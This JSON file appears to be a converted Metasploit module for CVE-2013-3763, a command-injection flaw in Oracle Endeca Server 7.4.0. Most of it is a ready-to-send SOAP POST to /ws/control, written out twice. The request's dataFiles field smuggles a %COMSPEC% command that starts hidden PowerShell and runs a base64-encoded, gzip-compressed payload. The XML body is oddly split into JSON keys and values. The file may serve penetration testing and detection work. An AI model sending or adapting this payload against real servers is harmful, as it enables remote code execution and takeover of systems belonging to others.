{
   "name" : "OracleEndecaExec",
   "cve" : "CVE-2013-3763",
   "msf_module" : "oracle_endeca_exec",
   "references" : [
      "http://www.oracle.com/technetwork/topics/security/cpujuly2013-1899826.html"
   ],
   "requests" : {
      "EXPLOIT1" : {
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "METHOD" : "POST",
         "            <ns:name>fPqq</ns:name>\n" : "            <ns:dataFiles>c:\\&#x22;&#x26; %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){\\$b=\\'powershell.exe\\'}else{\\$b=\\$env:windir+\\'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\\'};\\$s=New-Object System.Diagnostics.ProcessStartInfo;\\$s.FileName=\\$b;\\$s.Arguments=\\'-noni -nop -w hidden -c &#x26;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(\\'\\'H4sIAEgJC1oCA7VV+0/bSBD+GST+h1VlyWvJWKageyAhnRMIRSIhrSlUl0bVYo+ThfVuurumWL3+7zfrBwQBFT3prEjZxzy/b2a2qGRmuZLkekK+b21uTJlmJaHe3eQsJN7NN4gHwcYGXnjV73ujmBwQOktWq0NVMi7n+/vDSmuQtt1Hx2ATY6C8EhwMDcg/5HIJGrbPrq4hs+Q78b5Ex0JdMdGJ1UOWLYFsJzJ3d6cqYy6aKF0Jbqn/+bMfzLZ35tHR14oJQ/20NhbKKBfCD8iPwDk8r1dA/THPtDKqsNEll7tvo4/SsAImaO0WxmCXKjd+gGngT4OttCRtQs5Ce099XE61ypI812BQPDqRt+oGqCcrIULyF5117j9U0vIS8N6CVqsU9C3PwETvmMwFfIBiTifwrc/6tUp0XQmlplYHIVLxXJxjlVcCWlU/eBqp4y/A755DzP3H1ubWZtHzXcp1vnG1MWvWgNHRqTK8kTogcUjG6IZZpWvceue6gmBOZg722XxOvOVxEb6svtPLomR5neYDPJtdKJ7PUacjxKvP3OnLZXUIBZdwWEtW8qyvHPocxlAIaPKLerEJxkT97gLyQxCwYNaBFpLZU7Wjktt73UHFRQ46yZAng1EhhcHjYFoeqH8ix1AiQu3eR9gLrFfopbsarXvvbo9C/lAwY0IyrbBhspCkwATkIUmk4d1VUlnVLP2HcMeVsDxjxvbm5kGLYudtqKSxusqQMsz8PF1BxplwQITkHc9hUKd80Xv1n4VhyITgcoGWbpEGPHHpp9YVgsYAHelBlII9KVcCShRp2nYk2AKbtKv0pnDYAnL/cXh9Gbc162Do818LDrlNhbIhueDaYu87SJv6+U/O17oewxhq6DigfVvMBrV15eyp+IurxQ6RJn9tMfeRVuWAGfhtL7UakaFvPu38+f79hRifx6OjTzt/HLxxjtCTJ0/r8ZqNl/p+zLRZMoG2sZ97JkdKj7oOnSruNCjFyXwDWoLAsYaDr0ckEUJlbkBgJ+NoagfGHNn8iMvdt8+uAnIvGDxMjf5of/9vjBABRhCiU5ALuwzju904xhkQ3+3FmODrkxqqVU2dpdCNkAaUzrJoLAcOdm+R/J9IdUQv8S//OVIPZz+5fRV6cdjm+uT48cEvYfmLaV8yblEuxTIV0A7I57LvSmLt9VgkyHfRfe71Pqvs9gSflH8BudZJuyYIAAA=\\'\\'))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\\';\\$s.UseShellExecute=\\$false;\\$s.RedirectStandardOutput=\\$true;\\$s.WindowStyle=\\'Hidden\\';\\$s.CreateNoWindow=\\$true;\\$p=[System.Diagnostics.Process]::Start(\\$s);\" &#x26;&#x22;</ns:dataFiles>\n",
         "      <ns:createDataStore>\n" : "         <ns:dataStoreConfig>\n",
         "         </ns:dataStoreConfig>\n" : "      </ns:createDataStore>\n",
         "PATH" : "",
         "   <soapenv:Header/>\n" : "   <soapenv:Body>\n",
         "HEADERS" : {
            "SOAPAction" : "\"\"",
            "Content-Type" : "text/xml; charset=utf-8"
         },
         "PAYLOAD" : "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"http://www.endeca.com/endeca-server/control/1/0\">\n",
         "TEXT" : "Sending Exploit #1 Request : [POST] /",
         "   </soapenv:Body>\n" : "</soapenv:Envelope>\n"
      }
   },
   "paths" : [
      "ws/control"
   ],
   "osvdb" : 95269,
   "platform" : "WINDOWS",
   "method" : "POST",
   "description" : "\n\n        This module exploits a command injection vulnerability on the Oracle Endeca\n\n        Server 7.4.0. The vulnerability exists on the createDataStore method from the\n\n        controlSoapBinding web service. The vulnerable method only exists on the 7.4.0\n\n        branch and isn't available on the 7.5.5.1 branch. In addition, the injection\n\n        has been found to be Windows specific. This module has been tested successfully\n\n        on Endeca Server 7.4.0.787 over Windows 2008 R2 (64 bits).\n\n      ",
   "title" : "Oracle Endeca Server Remote Command Execution",
   "variables" : {
      "PATH" : {
         "DESCRIPTION" : "The URI path of the Control Web Service",
         "VALUE" : "/ws/control"
      }
   },
   "informations" : {
      "METHOD" : "POST",
      "TYPE" : "MSF",
      "PLATFORM" : "WINDOWS",
      "PATHS" : [
         "ws/control"
      ],
      "REFERENCES" : [
         "http://www.oracle.com/technetwork/topics/security/cpujuly2013-1899826.html"
      ],
      "MSF_MODULE" : "oracle_endeca_exec",
      "VARIABLES" : {
         "PATH" : {
            "DESCRIPTION" : "The URI path of the Control Web Service",
            "VALUE" : "/ws/control"
         }
      },
      "DESCRIPTION" : "\n\n        This module exploits a command injection vulnerability on the Oracle Endeca\n\n        Server 7.4.0. The vulnerability exists on the createDataStore method from the\n\n        controlSoapBinding web service. The vulnerable method only exists on the 7.4.0\n\n        branch and isn't available on the 7.5.5.1 branch. In addition, the injection\n\n        has been found to be Windows specific. This module has been tested successfully\n\n        on Endeca Server 7.4.0.787 over Windows 2008 R2 (64 bits).\n\n      ",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "METHOD" : "POST",
            "            <ns:name>fPqq</ns:name>\n" : "            <ns:dataFiles>c:\\&#x22;&#x26; %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){\\$b=\\'powershell.exe\\'}else{\\$b=\\$env:windir+\\'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\\'};\\$s=New-Object System.Diagnostics.ProcessStartInfo;\\$s.FileName=\\$b;\\$s.Arguments=\\'-noni -nop -w hidden -c &#x26;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(\\'\\'H4sIAEgJC1oCA7VV+0/bSBD+GST+h1VlyWvJWKageyAhnRMIRSIhrSlUl0bVYo+ThfVuurumWL3+7zfrBwQBFT3prEjZxzy/b2a2qGRmuZLkekK+b21uTJlmJaHe3eQsJN7NN4gHwcYGXnjV73ujmBwQOktWq0NVMi7n+/vDSmuQtt1Hx2ATY6C8EhwMDcg/5HIJGrbPrq4hs+Q78b5Ex0JdMdGJ1UOWLYFsJzJ3d6cqYy6aKF0Jbqn/+bMfzLZ35tHR14oJQ/20NhbKKBfCD8iPwDk8r1dA/THPtDKqsNEll7tvo4/SsAImaO0WxmCXKjd+gGngT4OttCRtQs5Ce099XE61ypI812BQPDqRt+oGqCcrIULyF5117j9U0vIS8N6CVqsU9C3PwETvmMwFfIBiTifwrc/6tUp0XQmlplYHIVLxXJxjlVcCWlU/eBqp4y/A755DzP3H1ubWZtHzXcp1vnG1MWvWgNHRqTK8kTogcUjG6IZZpWvceue6gmBOZg722XxOvOVxEb6svtPLomR5neYDPJtdKJ7PUacjxKvP3OnLZXUIBZdwWEtW8qyvHPocxlAIaPKLerEJxkT97gLyQxCwYNaBFpLZU7Wjktt73UHFRQ46yZAng1EhhcHjYFoeqH8ix1AiQu3eR9gLrFfopbsarXvvbo9C/lAwY0IyrbBhspCkwATkIUmk4d1VUlnVLP2HcMeVsDxjxvbm5kGLYudtqKSxusqQMsz8PF1BxplwQITkHc9hUKd80Xv1n4VhyITgcoGWbpEGPHHpp9YVgsYAHelBlII9KVcCShRp2nYk2AKbtKv0pnDYAnL/cXh9Gbc162Do818LDrlNhbIhueDaYu87SJv6+U/O17oewxhq6DigfVvMBrV15eyp+IurxQ6RJn9tMfeRVuWAGfhtL7UakaFvPu38+f79hRifx6OjTzt/HLxxjtCTJ0/r8ZqNl/p+zLRZMoG2sZ97JkdKj7oOnSruNCjFyXwDWoLAsYaDr0ckEUJlbkBgJ+NoagfGHNn8iMvdt8+uAnIvGDxMjf5of/9vjBABRhCiU5ALuwzju904xhkQ3+3FmODrkxqqVU2dpdCNkAaUzrJoLAcOdm+R/J9IdUQv8S//OVIPZz+5fRV6cdjm+uT48cEvYfmLaV8yblEuxTIV0A7I57LvSmLt9VgkyHfRfe71Pqvs9gSflH8BudZJuyYIAAA=\\'\\'))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\\';\\$s.UseShellExecute=\\$false;\\$s.RedirectStandardOutput=\\$true;\\$s.WindowStyle=\\'Hidden\\';\\$s.CreateNoWindow=\\$true;\\$p=[System.Diagnostics.Process]::Start(\\$s);\" &#x26;&#x22;</ns:dataFiles>\n",
            "      <ns:createDataStore>\n" : "         <ns:dataStoreConfig>\n",
            "         </ns:dataStoreConfig>\n" : "      </ns:createDataStore>\n",
            "PATH" : "",
            "   <soapenv:Header/>\n" : "   <soapenv:Body>\n",
            "HEADERS" : {
               "SOAPAction" : "\"\"",
               "Content-Type" : "text/xml; charset=utf-8"
            },
            "PAYLOAD" : "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"http://www.endeca.com/endeca-server/control/1/0\">\n",
            "TEXT" : "Sending Exploit #1 Request : [POST] /",
            "   </soapenv:Body>\n" : "</soapenv:Envelope>\n"
         }
      },
      "name" : "OracleEndecaExec",
      "OSVDB" : 95269,
      "CVE" : "CVE-2013-3763",
      "TITLE" : "Oracle Endeca Server Remote Command Execution"
   },
   "detection" : {},
   "type" : "MSF",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/"
}
